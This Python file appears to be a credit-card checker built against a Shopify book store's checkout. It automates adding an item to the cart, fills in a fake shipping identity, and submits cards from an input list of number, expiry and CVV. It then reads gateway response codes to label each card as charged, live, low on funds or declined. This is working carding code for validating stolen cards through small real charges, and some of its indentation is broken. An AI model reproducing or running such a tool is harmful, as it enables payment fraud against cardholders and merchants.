import os
import time
import urllib

from .rand_user import random_user_api
from ..filters.checker_defs import find_between

def one(s):
    # a = r.get('https://www.edensgarden.com/collections/roll-ons/products/eucalyptus-roll-on')
    # if a.status_code != 200: return False
    url = 'https://www.owlcrate.com/cart/add.js'
    headers = {
        'Host': 'www.owlcrate.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/json;charset=utf-8',
        'Origin': 'https://www.owlcrate.com',
        'Alt-Used': 'www.owlcrate.com',
        'Connection': 'keep-alive',
        'Referer': 'https://www.owlcrate.com/products/zodiac-adventure-button-pin?variant=39728207855791',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'TE': 'trailers'
    }
    data = '{"quantity":1,"id":39728207855791,"properties":{"cart_limit":null}}'

    b = s.post(url=url, headers=headers, data=data)
    if b.status_code != 200: return False
    url = 'https://www.owlcrate.com/cart'
    headers = {
        'Host': 'www.owlcrate.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.owlcrate.com',
        'Alt-Used': 'www.owlcrate.com',
        'Connection': 'keep-alive',
        'Referer': 'https://www.owlcrate.com/cart',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers'
}
    data = 'updates%5B%5D=1&checkout=Checkout'
    d = s.post(url=url, headers=headers, data=data)
    # with open('d.html', 'w', encoding='utf-8') as wr: wr.write(d.text)
    # sho_auth= find_between(d.text, 'name="shopify-checkout-authorization-token" content="', '"')
    auth_token = find_between(d.text, 'type="hidden" name="authenticity_token" value="','"')
    # checkout_id= find_between(d.text,'"checkoutToken":"','"')
    url = d.url
    return (auth_token, url) if auth_token else False




def two(s,url,auth_token, rand_user):
    headers = {
    'Host': 'www.owlcrate.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.owlcrate.com/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.owlcrate.com',
    'Alt-Used': 'www.owlcrate.com',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'TE': 'trailers'
    }
    data = f'_method=patch&authenticity_token={auth_token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D={rand_user.email}&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Decoder&checkout%5Bshipping_address%5D%5Blast_name%5D=xD&checkout%5Bshipping_address%5D%5Baddress1%5D=9436+deer+lodge&checkout%5Bshipping_address%5D%5Baddress2%5D=23&checkout%5Bshipping_address%5D%5Bcity%5D=las+vegas&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bprovince%5D=NV&checkout%5Bshipping_address%5D%5Bzip%5D=89129&checkout%5Bshipping_address%5D%5Bphone%5D=%28856%29+785-7683&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1025&checkout%5Bclient_details%5D%5Bbrowser_height%5D=739&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330'
    e = s.post(url=url, headers=headers, data=data)
    shipping_rate = urllib.parse.quote_plus(find_between(e.text, '<div class="radio-wrapper" data-shipping-method="', '">'))
    if e.status_code != 200:
        return False
    headers = {
    'Host': 'www.owlcrate.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.owlcrate.com/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.owlcrate.com',
    'Alt-Used': 'www.owlcrate.com',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'TE': 'trailers'
    }
    data = f'_method=patch&authenticity_token={auth_token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D={shipping_rate}&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1042&checkout%5Bclient_details%5D%5Bbrowser_height%5D=739&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330'
    g = s.post(url=url, headers=headers, data=data)
    if g.status_code != 200:
        return False
    h = s.get(g.url)
    if h.status_code != 200:
        return False
    payment_gateway = find_between(h.text,'data-subfields-for-gateway="','"')
    return False if not payment_gateway else payment_gateway


def three(r, payment_gateway, lista, rand_user,auth_token, url):
    cc,mes,ano,cvv = lista
        json_four = {
        "credit_card": {
            "number": cc,
            "name": rand_user.name,
            "month": mes,
            "year": ano,
            "verification_value": cvv
        },
        "payment_session_scope": "www.owlcrate.com"
    }

    four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
    if 'id' not in four.json(): return False
        headers = {
      'Host': 'www.owlcrate.com',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Referer': 'https://www.owlcrate.com/',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://www.owlcrate.com',
      'Alt-Used': 'www.owlcrate.com',
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-User': '?1',
      'TE': 'trailers'
    }
    data = f'_method=patch&authenticity_token={auth_token}&previous_step=payment_method&step=&s={four.json()["id"]}&checkout%5Bpayment_gateway%5D={payment_gateway}&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=624&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1042&checkout%5Bclient_details%5D%5Bbrowser_height%5D=739&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330'
    g = r.post(url, data = data, headers = headers)
    time.sleep(4)
    if g.status_code != 200:
        return False
    h = r.get(f'{g.url}?from_processing_page=1')
    if h.status_code != 200:
        return False
    i = r.get(f'{h.url}&validate=true')
    return False if i.status_code != 200 else i.text



def get_response_shn(text):
    if 'Thank you' in text or 'Your order is confirmed' in text:
        r_text, r_logo, r_respo = "Charged $6", "✅", 'Charged'
        return r_text, r_logo, r_respo,
    text1 = find_between(text, '<p class="notice__text">','</p></div></div>')
    text = text1 if text1 else text
    if "2038" in text or "2046" in text:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'Rejected'
    elif "2005" in text:
        r_text, r_logo, r_respo = "INCORRECT NUMBER", "❌", 'Rejected'
    elif "2059" in text or "2060" in text :
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'Charged'
    elif "2001"  in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'Charged'
    elif "2010" in text:
        r_text, r_logo, r_respo = "CCN LIVE", "✅", 'CCN Match'
    elif "2015" in text or "2023" in text:
        r_text, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", 'Rejected'
    elif "Customer authentication is required" in text or "unable to authenticate" in text or "three_d_secure_redirect" in text or "hooks.stripe.com/redirect/" in text or 'requires an authorization' in text or 'card_error_authentication_required' in text:
        r_text, r_logo, r_respo = "3D SECURITY", "❌", 'Rejected'
    elif "2004" in  text or "2006" in text:
        r_text, r_logo, r_respo = "EXPIRED CARD", "❌", 'Rejected'
    elif '"seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "Charged $6", "✅", 'Charged'
    else:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'Rejected'
    r_text1 = text1.replace('-','') if text1 else r_text
    return r_text1,r_logo,r_respo
